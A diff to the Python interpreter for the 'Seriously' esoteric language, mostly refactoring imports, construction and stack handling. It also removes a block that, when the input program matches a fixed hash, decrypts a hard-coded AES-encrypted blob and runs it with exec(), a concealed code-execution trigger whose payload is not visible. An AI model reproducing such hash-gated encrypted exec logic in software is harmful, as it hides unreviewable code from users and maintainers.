@@ -15,9 +15,9 @@ import random
 import re
 import traceback
 from . import SeriouslyCommands
-from lib.cp437 import CP437
-from lib.iterable import deque, as_list
-from lib.nicenames import nice_names
+from seriouslylib.cp437 import CP437
+from seriouslylib.iterable import deque, as_list
+from seriouslylib.nicenames import nice_names
 
 anytype = SeriouslyCommands.anytype
 
@@ -54,12 +54,8 @@ def remove_lists_and_strings(code):
     return result
 
 class Seriously:
-    @classmethod
-    def _make_new(cls, init=None, debug_mode=False):
-        return cls([] if init is None else init, debug_mode)
-
     def make_new(self, *stack):
-        return self._make_new(init=list(stack), debug_mode=self.debug_mode)
+        return self.__class__(list(stack), self.debug_mode)
 
     def __init__(self, init_stack=None, debug_mode=False):
         self.stack = deque(init_stack if init_stack is not None else [])
@@ -97,7 +93,7 @@ class Seriously:
         if self.debug_mode:
             print(code)
         i = 0
-        if all(x not in remove_lists_and_strings(code) for x in (',',chr_cp437(0xCA),chr_cp437(0x09),chr_cp437(0x15))):
+        if all([x not in remove_lists_and_strings(code) for x in (',',chr_cp437(0xCA),chr_cp437(0x09),chr_cp437(0x15))]):
             for line in sys.stdin.read().splitlines():
                 self.push(literal_eval(line))
                 self.inputs.append(literal_eval(line))
@@ -142,7 +138,6 @@ class Seriously:
                                 continue
                         if self.debug_mode:
                             print("Failed to eval numeric")
-                    val = val if anytype(val, int, float, complex) else 0
                     self.push(val)
                 elif c == 'W':
                     inner = ''
@@ -242,22 +237,14 @@ class Seriously:
                 self.stack = old_stack
             finally:
                 i += 1
-        return as_list(self.stack)[::-1]
+        result = as_list(self.stack)
+        result.reverse()
+        return result
 
 def srs_exec(debug_mode=False, file_obj=None, code=None, ide_mode=False, nice_names=False): # pragma: no cover
     code = code or file_obj.read()
     if nice_names:
         code = minimize(code)
-    if (not ide_mode) and hashlib.sha256(code.encode()).hexdigest() == 'e8809dfaff977e1b36210203b7b44e83102263444695c1123799bc43358ae1c2':
-        try:
-            from Crypto.Cipher import AES
-            hidden = binascii.unhexlify(b'f2ac048e406d7244ca202e34841611e115a9c97d554d0681a9ad1bb8f3d7f30b083ae2bae60721228fa5caaa39d205e4e8c61421b9e8fdcbd4b03cafa0e6d726540de6e8bbddf42796a63eb3112c0890bc2f32a435ae304c1bc8d9a463402c9ef1b3fcdbf53743cb737a147bb1aa16e4a71a22adac29d1b310358c40699edf897942e83ff7e1949777eebc02e9ecf24e')
-            cipher = AES.new(code.encode(), AES.MODE_ECB)
-            secret = cipher.decrypt(hidden).decode()
-            exec(secret)
-            exit()
-        except ImportError:
-            pass
     srs = Seriously(debug_mode=debug_mode)
     for x in srs.eval(code):
         print(x)
